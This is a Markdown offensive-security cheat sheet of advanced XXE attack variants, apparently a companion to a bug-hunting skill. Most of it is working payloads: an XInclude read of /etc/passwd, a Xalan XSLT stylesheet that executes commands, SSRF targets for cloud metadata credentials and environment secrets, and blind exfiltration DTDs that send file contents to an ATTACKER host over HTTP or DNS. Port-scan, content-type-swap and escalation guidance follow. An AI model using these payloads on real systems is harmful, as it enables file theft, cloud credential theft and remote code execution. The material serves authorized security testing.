# XXE — advanced variant matrix (XInclude, XSLT, schema, SSRF, error oracle)

Companion to `hunt-xxe`. The main skill has the classic DOCTYPE payloads + parser-ecosystem
table. This file covers the **bypass/escalation variants** that fire when DOCTYPE is blocked
or stripped, plus the RCE and SSRF edges.

## 1. XInclude (fires when DOCTYPE/<!ENTITY> is stripped server-side)

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
Works on parsers that support XInclude but strip the DOCTYPE — `parse="text"` returns the
file contents raw. Convert an SSRF to file-read by pointing `href` at a local file.

## 2. XSLT / Xalan extensions (XXE → RCE on Java)

When the XML flows into an XSL transform (unrestricted XSLT extensions):
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
  version="1.0">
  <xsl:template match="/">
    <xsl:variable name="rtobj" select="rt:getRuntime()"/>
    <xsl:variable name="proc" select="rt:exec($rtobj,'id')"/>
    <xsl:value-of select="$proc"/>
  </xsl:template>
</xsl:stylesheet>
```
IIS/`asp.NET` XSLT (`<msxsl:script language="C#">`) is the .NET equivalent — C# exec inside
an `<xsl:script>` block. Saxon/Xalan/older XmlSpy are the vulnerable processors.

## 3. XXE → SSRF matrix (beyond `http://169.254.169.254`)

```
file:///etc/passwd                     classic file read
http://169.254.169.254/latest/meta-data/iam/security-credentials/   AWS IMDS
http://metadata.google.internal/computeMetadata/v1/…   GCP (needs Metadata-Flavor via header — hard in XXE)
file:///proc/self/environ              env secrets
file:///proc/self/cmdline              argv (DB creds often here)
php://filter/convert.base64-encode/resource=/etc/passwd   PHP-stack file read (binary-safe)
jar:file:///path/to/war!/WEB-INF/web.xml   Java archive read
netdoc:///etc/passwd                   Java-specific file wrapper
ftp://internal/                        FTP bounce / internal probe
gopher://internal:6379/_...            (when libxml2 lets gopher through) → Redis
```

## 4. Exfil channels (blind XXE)

```
# HTTP OOB — parameter entity + external DTD (two-stage)
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd"> %dtd;
# evil.dtd:  <!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER/?d=%file;'>"> %all;

# DNS-only exfil (HTTP egress blocked, port 53 open)
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://%data;.ATTACKER.example/'>">

# Error-based exfil (zero egress — local DTD repurpose, PortSwigger)
# reference /usr/share/.../docbookx.dtd, redefine ISOamso, leak file in parse error

# Error message exfil — force a parse error that embeds file content
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % err SYSTEM 'file:///nonexistent/%file;'>"> %eval; %err;
```

## 5. SSRF-time / boolean oracle (internal port scan via XXE)

Same discipline as `hunt-ssrf`: point the entity at `10.0.0.x:port` / `127.0.0.1:port` and
diff response time / error text / body size. Closed port → fast "connection refused"; filtered
→ hang; open service → 200/parse diff. This is the internal-host/port map even when no file
read works.

## 6. Content-type swap + non-XML XML (the hidden parsers)

```
# JSON endpoint → XML body (many Java/.NET stacks parse both)
Content-Type: application/xml  +  <!DOCTYPE ...><root>&xxe;</root>
# SOAP: <soap:Envelope>…<value><![CDATA[&xxe;]]></value>
# SVG/GPG/KML/XLSX/[Content_Types].xml — all XML containers that get entity-resolved
# multipart: XML inside a form field while the rest is form-data
```

## 7. Escalation ladder

```
rung 1  inline-entity expands (&hello; -> hello)     → parser entities ON (lead)
rung 2  SYSTEM file:// read (/etc/passwd content)     → High
rung 3  OOB callback with file content                → High-Critical
rung 4  SSRF → IMDS internal metadata                → Critical (chain cloud)
rung 5  XSLT/Xalan/expect → RCE                       → Critical (chain hunt-rce)
```

Never file below rung 2. An inline entity that echoes confirms the parser resolves entities
but proves no impact by itself — that is your confirmation to escalate, not the finding.